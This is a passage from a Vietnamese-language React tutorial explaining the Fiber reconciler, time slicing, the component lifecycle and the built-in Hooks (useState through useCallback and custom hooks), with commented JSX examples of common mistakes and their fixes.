       └─ render(Nav)
            └─ render(NavItem) × 50
  └─ render(Main)
       └─ render(ArticleList)
            └─ render(Article) × 100
                 └─ render(Comment) × 20 each ...
```

Khi bắt đầu đệ quy, **JavaScript không thể dừng giữa chừng** — nó phải chạy hết toàn bộ cây mới xong. Với UI lớn (hàng nghìn node), main thread bị chiếm dụng liên tục hàng chục mili-giây → scroll giật, click không phản hồi, animation không mượt.

```
Main thread timeline (Stack Reconciler):
─────────────────────────────────────────────────────
[==== render toàn bộ cây (50ms) ====][user input][paint]
         ↑ không thể dừng ở đây       ↑ phải chờ!
```

####  React Fiber (từ React 16): Chia nhỏ công việc

Fiber viết lại toàn bộ reconciler, biến mỗi node thành một **Fiber Node** — object JS có con trỏ liên kết, không phụ thuộc call stack:

```javascript
// Cấu trúc Fiber Node (đơn giản hóa):
{
  tag: 'div',          // loại node
  key: null,
  props: { ... },
  stateNode: domNode,  // tham chiếu DOM thật
  child: FiberNode,    // con đầu tiên
  sibling: FiberNode,  // anh/chị em kế tiếp
  return: FiberNode,   // cha
  // ... priority, lanes, effects...
}
```

Nhờ cấu trúc liên kết này, React có thể chia công việc render thành các đơn vị để scheduler có cơ hội nhường quyền tại các điểm phù hợp:

```
Main thread timeline (React Fiber):
──────────────────────────────────────────────────────────
[render A–B][pause → user click][render C–D][paint]
      ↑ nhường main thread        ↑ tiếp tục
```

| Tiêu chí | Stack Reconciler (< 16) | Fiber Reconciler (16+) |
|----------|------------------------|------------------------|
| Cách duyệt cây | Đệ quy theo call stack | Fiber Node liên kết cha–con–anh em |
| Mô hình thực thi | Đồng bộ, không thể dừng | Chia nhỏ thành nhiều chunk (incremental) |
| Có thể tạm dừng |  Không |  Có (pause / resume / hủy) |
| Ảnh hưởng main thread | Dễ block khi cây lớn | Xen kẽ công việc, giảm block |
| Ưu tiên cập nhật | Gần như không có | Gán priority cho từng update |
| Nền tảng cho | — | Concurrent Rendering, Suspense, Transitions |

####  Time Slicing — cơ chế xen kẽ công việc

Fiber chia công việc render thành các **chunk nhỏ**. Sau mỗi chunk, React kiểm tra: "Có tương tác nào ưu tiên cao hơn không?" Nếu có (user click, keypress...), React **nhường main thread** để xử lý tương tác trước, rồi quay lại render sau — gọi là **time slicing**.

```
Không có time slicing (Stack):       Có time slicing (Fiber):
─────────────────────────────         ──────────────────────────────────────
[======= render (100ms) =======]      [chunk][click!][chunk][chunk][paint]
[click có thể bị chậm]                [có cơ hội xử lý click sớm hơn]
```

Đây là nền tảng cho **Concurrent Rendering** ở React 18+: React có thể bắt đầu render cập nhật ưu tiên thấp, nhường cho việc ưu tiên hơn, rồi tiếp tục, làm lại hoặc bỏ kết quả render trước commit. Nó không tự biến một hàm JavaScript nặng thành nhiều luồng CPU, không phải mọi update đều được time-slice, và không bảo đảm click luôn phản hồi tức thì.
<!-- content-id: component-lifecycle -->
## 5. Vòng Đời Component

### 5.1. Ba giai đoạn vòng đời

Mỗi component từ lúc xuất hiện đến lúc bị gỡ bỏ đều trải qua 3 giai đoạn:

```
                  Component được tạo
                        |
                        v
              ┌─────────────────────┐
              │      MOUNTING       │  ← lần đầu được thêm vào DOM
              │  render → DOM thật  │
              └─────────┬───────────┘
                        |
                        v
              ┌─────────────────────┐
              │      UPDATING       │  ← state/props đổi → render lại
              │  render lại nhiều   │     (có thể lặp nhiều lần)
              │  lần tùy thay đổi   │
              └─────────┬───────────┘
                        |
                        v
              ┌─────────────────────┐
              │     UNMOUNTING      │  ← bị gỡ khỏi DOM
              │  dọn dẹp side effect│
              └─────────────────────┘
```

- **Mounting:** component lần đầu xuất hiện — React tạo DOM node và chạy Effect sau commit. Thời điểm tương quan với paint phụ thuộc loại Effect và trình duyệt.
- **Updating:** state hoặc props thay đổi — React có thể gọi lại component để tính UI kế tiếp, reconciliation đối chiếu kết quả và commit thay đổi cần thiết lên renderer.
- **Unmounting:** component bị gỡ khỏi DOM — React chạy hàm cleanup để dọn dẹp (hủy timer, hủy subscription, abort request...).

---

### 5.2. Class Component và lifecycle method

Trước React 16.8, chỉ Class Component mới quản lý được state và vòng đời, thông qua các lifecycle method — mỗi method gắn với đúng một thời điểm trong vòng đời:

```
MOUNTING                    UPDATING                        UNMOUNTING
────────                    ────────                        ──────────
constructor()               static getDerivedStateFromProps()  componentWillUnmount()
static getDerivedState...   shouldComponentUpdate()
render()                    render()
componentDidMount()         getSnapshotBeforeUpdate()
                            componentDidUpdate()
```

**Các method phổ biến cần biết khi đọc code legacy:**

| Method | Giai đoạn | Mục đích thực tế |
|--------|-----------|------------------|
| `constructor(props)` | Mounting | Khởi tạo state, bind method |
| `render()` | Mounting + Updating | Trả về JSX — bắt buộc, phải là pure function |
| `componentDidMount()` | Sau Mounting | Fetch data, đăng ký event listener, tương tác DOM |
| `componentDidUpdate(prevProps, prevState)` | Sau Updating | Xử lý khi props/state đổi (so sánh với giá trị cũ để tránh vòng lặp vô tận) |
| `componentWillUnmount()` | Trước Unmounting | Dọn dẹp: hủy timer, hủy subscription, abort request |
| `shouldComponentUpdate(nextProps, nextState)` | Trước Updating | Tối ưu: trả về `false` để bỏ qua re-render không cần thiết |
| `getDerivedStateFromProps()` | Mounting + Updating | Cập nhật state từ props — hiếm dùng, thường là dấu hiệu thiết kế sai |
| `getSnapshotBeforeUpdate()` | Trước khi DOM thật cập nhật | Ghi lại giá trị DOM (ví dụ vị trí scroll) trước khi bị ghi đè |

**Ví dụ thực tế — component theo dõi chiều rộng cửa sổ:**

```jsx
class WindowWidthLogger extends React.Component {
  constructor(props) {
    super(props);
    this.state = { width: window.innerWidth };
    this.handleResize = this.handleResize.bind(this); // phải bind this thủ công
  }

  componentDidMount() {
    // Chạy SAU lần render đầu tiên — đây là nơi "đăng ký" sự kiện, fetch dữ liệu...
    window.addEventListener('resize', this.handleResize);
  }

  componentDidUpdate(prevProps, prevState) {
    // Chạy SAU mỗi lần re-render do state/props đổi
    // prevProps/prevState là giá trị TRƯỚC khi cập nhật — dùng để so sánh
    if (prevState.width !== this.state.width) {
      document.title = `Cửa sổ rộng ${this.state.width}px`;
    }
  }

  componentWillUnmount() {
    // Chạy TRƯỚC khi component bị gỡ — đây là nơi "dọn dẹp"
    window.removeEventListener('resize', this.handleResize);
  }

  handleResize() {
    this.setState({ width: window.innerWidth });
  }

  render() {
    return <div>Chiều rộng: {this.state.width}px</div>;
  }
}
```

**Hạn chế cụ thể của Class Component:**

**1. Logic liên quan bị tách rời vì lifecycle:**

Đăng ký `resize` nằm trong `componentDidMount`, hủy nằm trong `componentWillUnmount` — hai việc thuộc cùng một tính năng nhưng bị đặt ở hai nơi cách xa nhau. Khi component có 3 side effect khác nhau (resize, fetch API, subscribe websocket), code sẽ như sau:

```jsx
componentDidMount() {
  window.addEventListener('resize', this.handleResize);   // [resize]
  fetch('/api/data').then(...);                            // [fetch]
  this.socket = new WebSocket('wss://...');                // [ws]
  this.socket.onmessage = this.handleMessage;
}

componentWillUnmount() {
  window.removeEventListener('resize', this.handleResize); // [resize]
  // nhớ hủy fetch? nếu quên → memory leak khi unmount
  this.socket.close();                                     // [ws]
}
```

Logic của 3 tính năng bị trộn chung vào 2 method — rất dễ quên dọn dẹp, và càng khó đọc khi số lượng side effect tăng lên.

**2. Vấn đề `this`:**

`this` trong JavaScript Class không tự động bind vào method — phải bind thủ công trong constructor hoặc dùng arrow function. Quên một chỗ là lỗi ngay, và đây là nguồn bug rất phổ biến với người mới học React.

---

### 5.3. Function Component và Hooks — gom logic theo tính năng

React 16.8 giới thiệu Hooks, cho phép Function Component có đầy đủ khả năng quản lý state và vòng đời mà trước đây chỉ Class Component làm được. Quan trọng hơn, Hooks cho phép **gom toàn bộ logic của một tính năng vào một chỗ** thay vì tách rời theo lifecycle method.

**So sánh trực tiếp — cùng một tính năng, hai cách viết:**

```
Class Component                    Function Component + Hooks
──────────────────────────────────────────────────────────────
constructor()     ←→  useState() / useReducer()
componentDidMount ←→  useEffect(() => { ... }, [])
componentDidUpdate←→  useEffect(() => { ... }, [deps])
componentWillUnmount←→ return () => { ... } bên trong useEffect
```

Mỗi `useEffect` là một "đơn vị tính năng" khép kín: đăng ký và dọn dẹp nằm cùng một khối, dễ đọc và dễ đối chiếu:

```jsx
function WindowWidthLogger() {
  const [width, setWidth] = useState(window.innerWidth);

  // [tính năng resize] — gom lại trong 1 useEffect
  useEffect(() => {
    const handleResize = () => setWidth(window.innerWidth);
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize); // cleanup cùng chỗ
  }, []);

  // [tính năng cập nhật title] — useEffect riêng, độc lập
  useEffect(() => {
    document.title = `Cửa sổ rộng ${width}px`;
  }, [width]);

  return <div>Chiều rộng: {width}px</div>;
}
```

3 side effect riêng biệt — 3 `useEffect` riêng biệt — mỗi cái tự lo logic của mình, không trộn lẫn.

---


Class Component vẫn được React hỗ trợ, nhưng Hooks đã là chuẩn mực trong code React hiện đại. Custom Hooks — cách đóng gói và tái sử dụng logic — sẽ được trình bày chi tiết ở mục 6.8.

---

<!-- content-id: hooks -->
## 6. Hooks — Từng Hook Chi Tiết Và Cách Áp Dụng

React cung cấp một bộ hook built-in, mỗi hook giải quyết một nhóm vấn đề cụ thể:

```
Hook              Nhóm vấn đề
────────────────────────────────────────────────────────────────
useState          Lưu trữ state đơn giản trong component
useReducer        State phức tạp, nhiều nhánh logic liên quan
useEffect         Side effect: fetch, event listener, timer...
useRef            Tham chiếu DOM hoặc giá trị không gây re-render
useMemo           Ghi nhớ kết quả tính toán tốn kém
useCallback       Giữ nguyên reference hàm giữa các lần render
useContext        Đọc dữ liệu từ Context không qua props
```

**Luật Hooks (Rules of Hooks)** — bắt buộc phải tuân theo:

1. **Chỉ gọi hook ở top level** — không gọi bên trong `if`, vòng lặp, hay hàm lồng nhau. React xác định thứ tự hook bằng vị trí, nếu thứ tự thay đổi giữa các lần render thì state bị gán nhầm.
2. **Chỉ gọi hook trong Function Component hoặc custom hook** — không gọi trong hàm JS thường.

---

### 6.1. `useState` — quản lý state đơn giản

`useState` tạo một "vùng nhớ" riêng cho component, được React giữ lại xuyên suốt các lần render:

```jsx
const [count, setCount] = useState(0);
```

**Bẫy phổ biến với người mới — cập nhật dựa trên giá trị cũ:**

```jsx
// SAI trong một số trường hợp — dễ dính bug khi gọi nhiều lần liên tiếp
function handleClick() {
  setCount(count + 1);
  setCount(count + 1);
  setCount(count + 1);
}
// Kết quả: count chỉ tăng 1, KHÔNG phải 3!
```

Lý do: React **gom nhiều lệnh `setState` liên tiếp lại thành một lần render** (gọi là batching) để tối ưu hiệu năng. Cả 3 lời gọi `setCount(count + 1)` ở trên đều dùng chung giá trị `count` cũ (chưa kịp cập nhật) tại thời điểm hàm `handleClick` được tạo ra, nên cả 3 đều tính ra cùng một kết quả.

```jsx
// ĐÚNG — dùng dạng hàm (functional update) để luôn lấy giá trị mới nhất
function handleClick() {
  setCount(prev => prev + 1);
  setCount(prev => prev + 1);
  setCount(prev => prev + 1);
}
// Kết quả: count tăng đúng 3, vì mỗi lần React đưa "prev" mới nhất vào hàm
```

**Khi nào dùng `useReducer` thay vì `useState`:** xem mục 6.2 bên dưới.

---

### 6.2. `useReducer` — quản lý state phức tạp nhiều nhánh logic

Dùng `useReducer` khi state có nhiều nhánh logic liên quan với nhau (trạng thái loading/success/error của một request, form phức tạp nhiều field...).

**Nếu vẫn cố dùng `useState` cho trường hợp này — ví dụ quản lý trạng thái gọi API:**

```jsx
function UserProfile({ userId }) {
  // Phải khai báo RIÊNG LẺ từng mảnh state liên quan đến CÙNG một việc (gọi API)
  const [data, setData] = useState(null);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    setIsLoading(true);
    setError(null);

    fetch(`/api/users/${userId}`)
      .then(res => {
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        return res.json();
      })
      .then(json => {
        setData(json);       // set 1: thành công
        setIsLoading(false); // set 2: phải nhớ tắt loading
      })
      .catch(err => {
        setError(err);       // set 1: lỗi
        setIsLoading(false); // set 2: cũng phải nhớ tắt loading ở NHÁNH KHÁC
      });
  }, [userId]);

  if (isLoading) return <p>Đang tải...</p>;
  if (error) return <p>Lỗi: {error.message}</p>;
  return <div>{data.name}</div>;
}
```

**Vấn đề cụ thể của cách làm này:**

1. **3 lệnh `set` rời rạc cho CÙNG một khái niệm "trạng thái request".** Về bản chất, `data`, `isLoading`, `error` luôn phải đồng bộ với nhau (ví dụ: khi đang loading thì `error` phải là `null`, khi có `error` thì `isLoading` phải là `false`) — nhưng `useState` không có cơ chế nào ép buộc điều đó. Rất dễ viết thiếu 1 dòng `setIsLoading(false)` ở một nhánh nào đó, khiến UI kẹt mãi ở trạng thái "Đang tải..." dù request đã xong từ lâu.
2. **Không có "một nơi duy nhất" để xem toàn bộ các trạng thái hợp lệ có thể xảy ra.** Với `useState` rời rạc, để biết "app có thể ở những trạng thái nào" bạn phải đọc lướt toàn bộ component để tự suy luận, thay vì có ngay một danh sách rõ ràng.
3. **Khó tái sử dụng logic giống hệt ở component khác** — mỗi nơi cần gọi API tương tự lại phải khai báo lại `data`/`isLoading`/`error` và lặp lại đúng những lỗi tiềm ẩn ở trên.

**Viết lại bằng `useReducer` — gom mọi nhánh logic vào một hàm duy nhất:**

```jsx
function reducer(state, action) {
  switch (action.type) {
    case 'FETCH_START':
      return { data: null, isLoading: true, error: null };
    case 'FETCH_SUCCESS':
      return { data: action.payload, isLoading: false, error: null };
    case 'FETCH_ERROR':
      return { data: null, isLoading: false, error: action.payload };
    default:
      throw new Error('Unknown action');
  }
}

function UserProfile({ userId }) {
  const [state, dispatch] = useReducer(reducer, {
    data: null, isLoading: true, error: null
  });

  useEffect(() => {
    dispatch({ type: 'FETCH_START' });
    fetch(`/api/users/${userId}`)
      .then(res => {
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        return res.json();
      })
      .then(json => dispatch({ type: 'FETCH_SUCCESS', payload: json }))
      .catch(err => dispatch({ type: 'FETCH_ERROR', payload: err }));
  }, [userId]);

  if (state.isLoading) return <p>Đang tải...</p>;
  if (state.error) return <p>Lỗi: {state.error.message}</p>;
  return <div>{state.data.name}</div>;
}
```

**Vì sao bản này tốt hơn:** mỗi nhánh (`FETCH_START`, `FETCH_SUCCESS`, `FETCH_ERROR`) trả về **toàn bộ một object state hợp lệ trong một lần** — không có chuyện quên set `isLoading` ở một nhánh nào đó, vì mỗi `case` trong `reducer` tự chịu trách nhiệm mô tả đầy đủ cả 3 trường cùng lúc. Toàn bộ "các trạng thái có thể xảy ra" nằm gọn trong một hàm `reducer` duy nhất, dễ đọc lướt qua để nắm hết logic, và nếu muốn tái sử dụng, bạn chỉ cần đóng gói cả `reducer` + `useReducer` này vào một custom hook (như `useFetch(url)`) dùng lại ở nhiều nơi — kết hợp đúng ý tưởng custom hook đã nói ở phần 5.3.

**Ví dụ đơn giản hơn để nắm cú pháp cơ bản (counter):**

Thay vì gọi `setState` rải rác ở nhiều nơi, bạn mô tả các "hành động" (action) và gom logic xử lý vào một hàm `reducer` duy nhất:

```jsx
function reducer(state, action) {
  switch (action.type) {
    case 'increment':
      return { count: state.count + 1 };
    case 'decrement':
      return { count: state.count - 1 };
    default:
      throw new Error('Unknown action');
  }
}

function Counter() {
  const [state, dispatch] = useReducer(reducer, { count: 0 });
  return (
    <>
      <p>{state.count}</p>
      <button onClick={() => dispatch({ type: 'increment' })}>+</button>
      <button onClick={() => dispatch({ type: 'decrement' })}>-</button>
    </>
  );
}
```

### 6.3. `useEffect` — cầu nối với thế giới bên ngoài

```jsx
useEffect(() => {
  // side effect: gọi API, đăng ký sự kiện, thao tác DOM...
  return () => {
    // cleanup: chạy trước khi effect chạy lại, hoặc trước khi unmount
  };
}, [dependencies]);
```

Effect dùng để **đồng bộ component với một hệ thống bên ngoài** như network, subscription, timer hoặc API trình duyệt. Nó chỉ chạy cho UI đã commit. Không dùng Effect chỉ để tính một giá trị có thể suy ra ngay khi render.

**3 cách khai báo dependency và ý nghĩa khác nhau:**

```jsx
useEffect(() => { /* ... */ });          // chạy sau MỌI lần render
useEffect(() => { /* ... */ }, []);      // setup sau mount; cleanup khi unmount (và có thể setup/cleanup thêm trong Strict Mode development)
useEffect(() => { /* ... */ }, [userId]); // chạy lại mỗi khi userId đổi
```

**Ví dụ cụ thể fetch dữ liệu khi `userId` đổi:**

```jsx
function UserProfile({ userId }) {
  const [user, setUser] = useState(null);

  useEffect(() => {
    let cancelled = false;

    fetch(`/api/users/${userId}`)
      .then(res => {
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        return res.json();
      })
      .then(data => {
        if (!cancelled) setUser(data); // tránh set state nếu component đã unmount
      });

    return () => { cancelled = true; }; // bỏ qua kết quả cũ nếu userId đổi tiếp hoặc unmount
  }, [userId]);

  return user ? <div>{user.name}</div> : <div>Đang tải...</div>;
}
```

Nếu bạn quên đưa `userId` vào mảng dependency, effect sẽ luôn dùng giá trị `userId` **tại lần đầu tiên** component mount, dù prop `userId` đã đổi sau đó — dẫn đến hiển thị sai user. Đây chính là hiện tượng "stale closure" sẽ nói kỹ ở phần 6.4.

**3 sai lầm phổ biến với `useEffect`:**

**Sai lầm 1 — Thiếu dependency gây stale closure:**
```jsx
// SAI: userId bị "đóng băng" tại lần mount đầu tiên
useEffect(() => {
  fetch(`/api/users/${userId}`).then(...);
}, []); // ← quên userId

// ĐÚNG:
useEffect(() => {
  fetch(`/api/users/${userId}`).then(...);
}, [userId]); // ← thêm vào dependency
```

**Sai lầm 2 — Object/Array trong dependency *có thể* gây vòng lặp:**
```jsx
// SAI: options = {} tạo object MỚI mỗi lần render → dependency luôn "đổi"
function MyComponent() {
  const [, setLastLoadedAt] = useState(null);
  const options = { timeout: 3000 }; // ← tạo mới mỗi lần render!

  useEffect(() => {
    fetchData(options).then(() => setLastLoadedAt(Date.now()));
  }, [options]); // effect cập nhật state → render → options mới → effect chạy lại
}

// ĐÚNG: dùng useMemo hoặc đưa object ra ngoài component
const OPTIONS = { timeout: 3000 }; // ← tạo một lần, reference ổn định
function MyComponent() {
  useEffect(() => {
    fetchData(OPTIONS);
  }, []); // ← không cần OPTIONS trong dependency vì nó không đổi
}
```

**Sai lầm 3 — Effect chạy 2 lần trong Strict Mode (React 18):**

Trong development với Strict Mode, React có thể chạy thêm một chu kỳ setup → cleanup → setup để kiểm tra Effect. Đây là **hành vi cố ý**, không phải bug. Hai request không tự chứng minh rằng bạn quên cleanup: cleanup có thể hủy request hoặc bỏ qua kết quả cũ, nhưng chiến lược cache/deduplication mới quyết định có request mạng thứ hai hay không.

```jsx
// Đảm bảo luôn có cleanup để Strict Mode không gây vấn đề:
useEffect(() => {
  const controller = new AbortController();
  fetch(url, { signal: controller.signal }).then(...);
  return () => controller.abort(); // ← cleanup: hủy fetch khi unmount
}, [url]);
```

<!-- content-id: stale-closure -->
### 6.4. Stale Closure — lỗi kinh điển của người mới học Hooks

**Stale closure** xảy ra khi hàm bên trong `useEffect` (hoặc bất kỳ callback nào) "giữ lại" giá trị state tại **thời điểm nó được tạo ra**, và không tự cập nhật theo state mới dù state đã đổi.

```jsx
import { useState, useEffect } from "react";

function Counter() {
  const [count, setCount] = useState(0);

  useEffect(() => {
    const id = setInterval(() => {
      console.log(count);      // LUÔN in ra 0
      setCount(count + 1);     // LUÔN tính 0 + 1 = 1
    }, 1000);

    return () => clearInterval(id);
}, []); // đăng ký interval từ snapshot lúc mount

  return <div>{count}</div>;
}
```

**Kết quả khi chạy:** `count` chỉ tăng lên 1 rồi đứng yên mãi mãi (không phải tăng đều mỗi giây), và `console.log` luôn in ra `0`.

**Giải thích cặn kẽ vì sao:** Effect này đăng ký callback ở render có `count = 0`. Interval giữ callback đó, nên mỗi giây nó vẫn tính `0 + 1` và yêu cầu `setCount(1)`. Render sau có snapshot khác, nhưng callback cũ không tự đổi theo snapshot mới. Sau lần đầu, React nhận lại cùng giá trị `1`, nên màn hình đứng ở 1.

**Cách sửa 1 — functional update (đơn giản nhất):**

```jsx
useEffect(() => {
  const id = setInterval(() => {
    setCount(prev => prev + 1); // React luôn đưa giá trị MỚI NHẤT vào "prev", không phụ thuộc closure
  }, 1000);
  return () => clearInterval(id);
}, []);
```

Đây là lý do nguyên tắc "luôn ưu tiên dạng hàm khi cập nhật state dựa trên giá trị cũ" (đã nói ở 6.1) không chỉ là thói quen tốt — nó là cách sửa triệt để lỗi stale closure.

**Cách sửa 2 — dùng `useRef` khi cần đọc giá trị mới nhất mà không muốn effect chạy lại:**

```jsx
function Counter() {
  const [count, setCount] = useState(0);
  const countRef = useRef(count);
  // Ghi ref trong render chỉ phù hợp khi giá trị này không tham gia output UI.
  // Đừng dùng nó như cách đồng bộ mặc định sau render.
  countRef.current = count;

  useEffect(() => {
    const id = setInterval(() => {
      console.log(countRef.current); // luôn đọc đúng giá trị mới nhất
    }, 1000);
    return () => clearInterval(id);
  }, []);

  return <div>{count}</div>;
}
```

### 6.5. `useContext` — đọc dữ liệu từ Context không qua props

`useContext` là hook tương ứng với Context API — cho phép component đọc trực tiếp dữ liệu từ Context gần nhất phía trên trong cây mà không cần nhận qua props trung gian.

```jsx
// 1. Tạo Context (thường để trong file riêng)
const ThemeContext = createContext('light'); // giá trị mặc định khi không có Provider

// 2. Provider bao bọc phần cây cần chia sẻ
function App() {
  const [theme, setTheme] = useState('dark');
  return (
    <ThemeContext.Provider value={theme}>
      <Toolbar />
    </ThemeContext.Provider>
  );
}

// 3. Bất kỳ component con nào đọc trực tiếp — dù nằm sâu bao nhiêu tầng
function Button() {
  const theme = useContext(ThemeContext); // không cần nhận qua props
  return <button className={theme}>Click</button>;
}
```

**Khi nào dùng `useContext`:**
- Dữ liệu cần chia sẻ ở nhiều component không liên quan nhau trong cây (theme, ngôn ngữ, thông tin user đăng nhập).
- Tránh prop drilling qua nhiều tầng trung gian không dùng đến dữ liệu đó.

**Giới hạn cần biết:** khi giá trị trong `Provider` thay đổi, **toàn bộ component** đang gọi `useContext` với context đó đều re-render — kể cả những component chỉ dùng một phần nhỏ không thay đổi. Vì vậy Context phù hợp với dữ liệu **ít thay đổi**; với dữ liệu cập nhật liên tục, nên dùng Redux Toolkit (xem chương 7).

**Pattern phổ biến — tách Provider thành custom hook:**

```jsx
// userContext.js
const UserContext = createContext(null);

export function UserProvider({ children }) {
  const [user, setUser] = useState(null);
  return (
    <UserContext.Provider value={{ user, setUser }}>
      {children}
    </UserContext.Provider>
  );
}

// Hook tiện dụng — không cần import UserContext ở mọi nơi
export function useUser() {
  const context = useContext(UserContext);
  if (!context) throw new Error('useUser phải dùng bên trong UserProvider');
  return context;
}

// Dùng trong component:
function Navbar() {
  const { user } = useUser(); // gọn hơn useContext(UserContext)
  return <div>Xin chào, {user?.name}</div>;
}
```

---

### 6.6. `useRef` — tham chiếu DOM và giá trị không gây re-render

`useRef` trả về một object `{ current: ... }` được React giữ nguyên xuyên suốt vòng đời component. Điểm khác biệt cốt lõi so với `useState`: **thay đổi `ref.current` không gây re-render**.

`useRef` có 2 mục đích chính:

**Mục đích 1 — truy cập trực tiếp DOM node:**

```jsx
function TextInputWithFocusButton() {
  const inputRef = useRef(null);

  const focusInput = () => {
    inputRef.current.focus(); // thao tác trực tiếp với DOM node thật
  };

  return (
    <>
      <input ref={inputRef} type="text" />
      <button onClick={focusInput}>Focus vào ô input</button>
    </>
  );
}
```

Dùng khi cần thao tác mà React không cung cấp API tương đương: focus, đo kích thước element, tích hợp thư viện DOM bên thứ ba (chart, map...).

**Mục đích 2 — lưu giá trị "nội bộ" không cần hiển thị lên UI:**

```jsx
function Stopwatch() {
  const [time, setTime] = useState(0);
  const intervalRef = useRef(null); // lưu id của setInterval

  const start = () => {
    if (intervalRef.current !== null) return; // không tạo interval trùng
    intervalRef.current = setInterval(() => {
      setTime(prev => prev + 1);
    }, 1000);
  };

  const stop = () => {
    if (intervalRef.current !== null) {
      clearInterval(intervalRef.current);
      intervalRef.current = null;
    }
  };

  useEffect(() => () => {
    if (intervalRef.current !== null) clearInterval(intervalRef.current);
  }, []); // giải phóng timer nếu component bị gỡ

  return (
    <div>
      <p>{time}s</p>
      <button onClick={start}>Bắt đầu</button>
      <button onClick={stop}>Dừng</button>
    </div>
  );
}
```

Nếu dùng `useState` để lưu `intervalId`, mỗi lần `setIntervalId(...)` sẽ gây re-render không cần thiết. `useRef` tránh điều đó vì đổi `current` không trigger render.

**Phân biệt `useState` vs `useRef`:**

```
                  useState          useRef
──────────────────────────────────────────────────────
Thay đổi gây      Có (re-render)    Không
re-render?

Giá trị tồn       Giữ qua render    Giữ qua render
tại qua render?

Dùng cho          Dữ liệu hiển      Giá trị nội bộ /
                  thị lên UI        tham chiếu DOM
```

---

### 6.7. `useMemo` — ghi nhớ kết quả tính toán tốn kém

`useMemo` nhận một hàm tính toán và mảng dependency — chỉ chạy lại hàm đó khi dependency thay đổi, các lần render khác trả về kết quả đã lưu cache.

```jsx
function ProductList({ products, keyword }) {
  // Không có useMemo: mỗi lần ProductList render lại (dù products/keyword không đổi),
  // hàm filter 10.000 sản phẩm này vẫn chạy lại từ đầu — lãng phí.
  const filtered = useMemo(() => {
    return products.filter(p => p.name.includes(keyword));
  }, [products, keyword]); // chỉ tính lại khi products hoặc keyword đổi

  return <ul>{filtered.map(p => <li key={p.id}>{p.name}</li>)}</ul>;
}
```

**Khi nào NÊN dùng `useMemo`:**
- Hàm tính toán thực sự nặng (filter/sort/aggregate dữ liệu lớn, tính toán phức tạp).
- Component re-render thường xuyên do lý do không liên quan đến dependency.

**Khi nào KHÔNG NÊN dùng:**
- Tính toán đơn giản (cộng 2 số, nối chuỗi) — chi phí so sánh dependency của `useMemo` còn nặng hơn chính phép tính.
- Không nên áp dụng tràn lan "cho chắc" — mỗi `useMemo` đều có overhead riêng và làm code khó đọc hơn.

---

### 6.8. `useCallback` — giữ nguyên reference hàm giữa các lần render

Mỗi lần component render, mọi hàm định nghĩa bên trong (`const handleClick = () => {...}`) đều được tạo ra như một **object mới** với địa chỉ bộ nhớ mới — dù logic bên trong giống hệt. Điều này gây vấn đề khi hàm đó được truyền như prop xuống component con đã được tối ưu bằng `React.memo`.

```jsx
function Parent() {
  const [count, setCount] = useState(0);

  // Không có useCallback: mỗi lần Parent render, handleClick là một hàm MỚI.
  // React.memo của ExpensiveChild so sánh prop onClick → thấy "đã đổi" → re-render.
  const handleClick = useCallback(() => {
    console.log('clicked');
  }, []); // dependency rỗng → reference ổn định, không đổi giữa các lần render

  return (
    <div>
      <p>{count}</p>
      <button onClick={() => setCount(count + 1)}>Tăng Parent</button>
      <ExpensiveChild onClick={handleClick} />
    </div>
  );
}

const ExpensiveChild = React.memo(function ExpensiveChild({ onClick }) {
  console.log('ExpensiveChild render');
  return <button onClick={onClick}>Click con</button>;
});
```

**Cách tự kiểm chứng:** xóa `useCallback`, thay bằng `const handleClick = () => {...}` thường, mở Console, click "Tăng Parent" nhiều lần — dòng log `ExpensiveChild render` xuất hiện dù ExpensiveChild không liên quan đến `count`. Thêm lại `useCallback` → dòng log biến mất (chỉ log 1 lần lúc mount).

**`useCallback` thực chất là `useMemo` cho hàm:**

```jsx
// Hai cách này tương đương:
useCallback(fn, deps)
useMemo(() => fn, deps)
```

**Khi nào NÊN dùng `useCallback`:**
- Hàm được truyền xuống component con đã bọc bằng `React.memo`.
- Hàm là dependency của `useEffect` ở component con.

**Khi nào KHÔNG NÊN dùng:** hàm chỉ dùng trong chính component đó (event handler thông thường không truyền xuống) — áp dụng `useCallback` ở đây là tối ưu không cần thiết.

---

### 6.9. Custom Hooks — đóng gói và tái sử dụng logic

Custom Hook là một hàm JavaScript thông thường — điểm đặc biệt duy nhất là **tên bắt đầu bằng `use`** và bên trong nó gọi các hook khác. Không có API đặc biệt nào cần học thêm.

**Trường hợp CHƯA custom — logic bị lặp lại ở từng component:**

Giả sử bạn cần biết chiều rộng cửa sổ ở cả `Sidebar` lẫn `Header` (2 component không liên quan nhau). Không có custom hook, bạn buộc phải copy-paste y hệt đoạn `useState` + `useEffect` vào từng nơi:

```jsx
function Sidebar() {
  const [width, setWidth] = useState(window.innerWidth);

  useEffect(() => {
    const handleResize = () => setWidth(window.innerWidth);
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  return <div>Sidebar rộng: {width}px</div>;
}

function Header() {
  // Y HỆT đoạn code ở Sidebar — chỉ copy-paste lại
  const [width, setWidth] = useState(window.innerWidth);

  useEffect(() => {
    const handleResize = () => setWidth(window.innerWidth);
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  return <div>Header rộng: {width}px</div>;
}
```

**Vấn đề cụ thể:**

1. **Trùng lặp code:** cùng một logic bị viết lại y hệt ở mọi nơi. Có 5 component cần biết `width` thì có 5 bản copy giống hệt nhau.
2. **Khó sửa đồng bộ:** muốn thêm debounce thì phải sửa ở tất cả các nơi đã copy — quên một chỗ là chỗ đó lỗi thời.
3. **Test khó hơn:** logic dính chặt vào component, không thể test độc lập.

**Sau khi custom hóa — viết một lần, dùng lại nhiều nơi:**

```jsx
function useWindowWidth() {
  const [width, setWidth] = useState(window.innerWidth);

  useEffect(() => {
    const handleResize = () => setWidth(window.innerWidth);
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  return width;
}

// Dùng lại ở bất kỳ component nào:
function Sidebar() {
  const width = useWindowWidth();
  return <div>Sidebar rộng: {width}px</div>;
}

function Header() {
  const width = useWindowWidth();
  return <div>Header rộng: {width}px</div>;
}
```

Nếu cần thêm debounce, chỉ sửa **đúng một chỗ** bên trong `useWindowWidth` — cả `Sidebar` và `Header` tự động hưởng thay đổi.

